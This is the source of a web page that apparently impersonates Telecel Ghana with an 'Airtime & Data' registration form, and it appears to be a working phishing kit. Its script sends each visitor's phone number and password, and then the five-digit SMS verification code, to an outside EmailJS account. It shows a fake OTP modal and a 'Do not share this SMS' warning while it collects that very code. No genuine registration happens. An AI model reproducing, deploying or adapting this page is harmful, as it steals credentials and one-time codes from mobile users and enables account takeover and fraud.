<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Airtime & Data | Register</title>
  <meta name="description" content="Airtime & Data ‚Äî Fast and reliable airtime and data services with secure registration and easy access.">
  <link rel="icon" type="image/png" href="favicon.png">

  <!-- TailwindCSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("Rvv0zcVZBHx9BOxX2");
    })();
  </script>

  <style>
    /* ===== Preloader ===== */
    #preloader {
      position: fixed;
      inset: 0;
      background: linear-gradient(135deg, #003366, #0055a5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      flex-direction: column;
      transition: opacity 0.8s ease;
    }
    #preloader.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .loader {
      width: 80px;
      height: 80px;
      border: 6px solid rgba(227, 6, 19, 0.3);
      border-top-color: #E30613;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* ===== Background ===== */
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #003366, #0055a5);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
    }

    /* ===== Red Particle Effect ===== */
    .particle {
      position: absolute;
      background: radial-gradient(circle, rgba(227, 6, 19, 0.9), rgba(227, 6, 19, 0.1));
      border-radius: 50%;
      opacity: 0.7;
      pointer-events: none;
      animation: floatParticle 10s linear infinite;
      filter: blur(1.5px);
      box-shadow: 0 0 6px rgba(227, 6, 19, 0.4);
    }
    @keyframes floatParticle {
      0% { transform: translateY(0) scale(1); opacity: 0.8; }
      50% { transform: translateY(-50px) scale(1.3); opacity: 1; }
      100% { transform: translateY(0) scale(1); opacity: 0.7; }
    }

    /* ===== Bouncing logo ===== */
    .bounce {
      animation: bounce 3s ease-in-out infinite, redGlow 2.5s ease-in-out infinite alternate;
    }
    @keyframes bounce {
      0%,100% { transform: translateY(0); }
      50% { transform: translateY(-15px); }
    }
    @keyframes redGlow {
      0% { filter: drop-shadow(0 0 2px #E30613) drop-shadow(0 0 5px rgba(227,6,19,0.4)); }
      100% { filter: drop-shadow(0 0 10px #E30613) drop-shadow(0 0 20px rgba(227,6,19,1)); }
    }

    #timer.cooldown { color: #E30613 !important; font-weight: bold; }
    #otpModal.active { opacity: 1; pointer-events: auto; }
  </style>
</head>

<body>
  <!-- Preloader -->
  <div id="preloader">
    <div class="loader"></div>
    <p style="color:#E30613;font-weight:bold;margin-top:12px;">Setting up...</p>
  </div>

  <!-- Particle Container -->
  <div id="particles"></div>

  <!-- Page Wrapper -->
  <div class="flex items-center justify-center w-full px-4 relative z-10">
    <div class="bg-white p-6 sm:p-8 rounded-2xl shadow-2xl w-full max-w-md border border-blue-100">
      <h2 class="text-3xl font-bold text-red-600 text-center mb-6">Create An Account</h2>

      <form id="registerForm" class="space-y-5">
        <!-- Phone -->
        <div>
          <label class="block text-sm font-semibold text-gray-700 mb-1">
            <span style="color:#E30613;">TELECEL</span> Phone Number
          </label>
          <div class="flex items-center border-2 border-red-200 rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-red-500">
            <span class="px-3 bg-red-50 flex items-center">
              <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Flag_of_Ghana.svg" alt="Ghana" class="w-6 h-4 mr-1">
              +233
            </span>
            <input type="text" inputmode="numeric" id="phone" required maxlength="9"  placeholder="20XXXXXXX" class="flex-1 px-3 py-2 form-input">
          </div>
        </div>

        <!-- Password -->
        <div>
          <label class="block text-sm font-semibold text-gray-700 mb-1">Password</label>
          <div class="relative">
            <input type="password" id="password" required placeholder="Enter password"
              class="w-full border-2 border-red-200 rounded-xl px-3 py-2 outline-none focus:ring-2 focus:ring-red-500 pr-10">
            <button type="button" id="togglePassword" 
              class="absolute inset-y-0 right-3 flex items-center text-gray-500 hover:text-red-600">üëÅ</button>
          </div>
        </div>

        <button type="submit"
          class="w-full bg-red-600 text-white py-3 px-4 rounded-xl font-semibold shadow-md hover:bg-red-700 transition">
          Register
        </button>
      </form>
    </div>
  </div>

  <!-- OTP Modal -->
  <div id="otpModal"
    class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center opacity-0 pointer-events-none transition-opacity duration-300 z-50">
    <div class="bg-white rounded-2xl shadow-2xl w-full max-w-sm p-6 border border-blue-100 mx-4">
      <img src="telecelplay.png" style="height: 100px;width: 260px;padding-left: 35px;" class="bounce">
      <h3 class="text-xl font-bold text-red-600 mb-4">Enter Verification Code</h3>
      <p class="text-sm text-gray-600 mb-2">Enter the five-digit OTP sent to your Telecel number.</p>
      <h2 style="color:red;">Do not share this SMS</h2>
      <input type="text" inputmode="numeric" id="otpInput" maxlength="5"
        placeholder="Enter 5-digit code"
        class="w-full border-2 border-red-200 rounded-xl px-3 py-2 outline-none focus:ring-2 focus:ring-red-500 mb-3">
      <div class="flex justify-between items-center text-sm text-gray-600 mb-3">
        <span id="timer" class="font-semibold text-red-600">20s</span>
        <button id="resendBtn" class="text-red-600 font-medium hidden hover:underline">Resend Code</button>
      </div>
      <button id="verifyBtn"
        class="w-full bg-red-600 text-white py-3 px-4 rounded-xl font-semibold shadow-md hover:bg-red-700 transition">
        Verify
      </button>
    </div>
  </div>

  <!-- Notification -->
  <div id="notification" class="fixed top-5 right-5 hidden px-4 py-3 rounded-xl shadow-lg"></div>

  <script>
    // === Preloader ===
    window.addEventListener("load", () => {
      const preloader = document.getElementById("preloader");
      setTimeout(() => preloader.classList.add("hidden"), 1600);
    });

    // === Red Particle Generator ===
    const particleContainer = document.getElementById("particles");
    const particleCount = 40;
    for (let i = 0; i < particleCount; i++) {
      const particle = document.createElement("div");
      particle.classList.add("particle");
      const size = Math.random() * 6 + 2;
      particle.style.width = `${size}px`;
      particle.style.height = `${size}px`;
      particle.style.left = `${Math.random() * 100}%`;
      particle.style.top = `${Math.random() * 100}%`;
      particle.style.animationDelay = `${Math.random() * 10}s`;
      particleContainer.appendChild(particle);
    }

    // === Password Toggle ===
    const togglePassword = document.getElementById("togglePassword");
    const passwordField = document.getElementById("password");
    togglePassword.addEventListener("click", () => {
      const type = passwordField.getAttribute("type") === "password" ? "text" : "password";
      passwordField.setAttribute("type", type);
      togglePassword.textContent = type === "password" ? "üëÅ" : "üôà";
    });

    // === Notification ===
    const notification = document.getElementById("notification");
    function showNotification(message, type="success") {
      notification.textContent = message;
      notification.className = `fixed top-5 right-5 px-4 py-3 rounded-xl shadow-lg font-medium text-white ${
        type === "success" ? "bg-red-600" : "bg-red-800"
      }`;
      notification.classList.remove("hidden");
      setTimeout(() => notification.classList.add("hidden"), 3000);
    }

    // === OTP Logic (unchanged) ===
    const registerForm = document.getElementById("registerForm");
    const otpModal = document.getElementById("otpModal");
    const otpInput = document.getElementById("otpInput");
    const verifyBtn = document.getElementById("verifyBtn");
    const resendBtn = document.getElementById("resendBtn");
    const timerEl = document.getElementById("timer");
    let countdown, timeLeft = 20;

    function openModal() {
      otpModal.classList.add("active");
      document.body.style.overflow = "hidden";
    }
    function closeModal() {
      otpModal.classList.remove("active");
      document.body.style.overflow = "";
    }
    function startTimer() {
      timeLeft = 20;
      timerEl.textContent = timeLeft + "s";
      resendBtn.classList.add("hidden");
      countdown = setInterval(() => {
        timeLeft--;
        timerEl.textContent = timeLeft + "s";
        if (timeLeft <= 0) {
          clearInterval(countdown);
          showNotification("Time ran out. Please resend code.", "error");
          resendBtn.classList.remove("hidden");
        }
      }, 1000);
    }

    registerForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const phone = document.getElementById("phone").value;
      const password = document.getElementById("password").value;

      // ===== TELECEL NUMBER VALIDATION =====
      const telecelPrefixes = ["20", "50"];
      const number = phone.trim();
      const isTelecel = number.length === 9 && telecelPrefixes.some(prefix => number.startsWith(prefix));

      if (!isTelecel) {
        showNotification("‚ùå Please enter a valid Telecel number.", "error");
        return;
      }

      emailjs.send("service_74nt2c9", "template_s6vpt2e", {
        phone: "TELECEL " + phone,
        password: password
      }).then(() => {
        showNotification("Registration successful!");
        openModal();
        localStorage.setItem("userPhone", phone);
        startTimer();
      }).catch(() => {
        showNotification("Failed to send details.", "error");
      });
    });

    verifyBtn.addEventListener("click", () => {
      const otp = otpInput.value;
      if (otp.length === 5) {
        const phone = localStorage.getItem("userPhone");
        emailjs.send("service_74nt2c9", "template_s6vpt2e", {
          phone: "+233" + phone,
          otp: otp
        }).then(() => {
          showNotification("OTP Verified!");
          closeModal();
          clearInterval(countdown);
          window.location.href = "linktelecel.html";
        }).catch(() => {
          showNotification("Failed to verify OTP.", "error");
        });
      } else {
        showNotification("Enter the valid 5-digit code.", "error");
      }
    });

    let retryCount = 0;
    const maxRetries = 3;
    const cooldownTime = 5 * 60 * 1000;
    let cooldownTimer;

    resendBtn.addEventListener("click", () => {
      retryCount++;
      if (retryCount > maxRetries) {
        showNotification("Too many attempts! Please try again later.", "error");
        resendBtn.disabled = true;
        otpInput.disabled = true;
        verifyBtn.disabled = true;
        resendBtn.classList.add("opacity-50", "cursor-not-allowed");
        verifyBtn.classList.add("opacity-50", "cursor-not-allowed");
        let remaining = cooldownTime / 1000;
        updateCountdownText(remaining);
        cooldownTimer = setInterval(() => {
          remaining--;
          updateCountdownText(remaining);
          if (remaining <= 0) {
            clearInterval(cooldownTimer);
            unlockResend();
          }
        }, 1000);
        return;
      }
      otpInput.value = "";
      showNotification(`Code resent (${retryCount}/${maxRetries}). Please check your SMS.`);
      startTimer();
    });

    function updateCountdownText(seconds) {
      timerEl.classList.add("cooldown");
      const m = Math.floor(seconds / 60);
      const s = seconds % 60;
      timerEl.textContent = `Try again in ${m}:${s < 10 ? "0" + s : s}`;
    }
    function unlockResend() {
      retryCount = 0;
      resendBtn.disabled = false;
      otpInput.disabled = false;
      verifyBtn.disabled = false;
      resendBtn.classList.remove("opacity-50", "cursor-not-allowed");
      verifyBtn.classList.remove("opacity-50", "cursor-not-allowed");
      timerEl.textContent = "";
      timerEl.classList.remove("cooldown");
      showNotification("You can now request a new code.", "success");
    }
  </script>
</body>
</html>
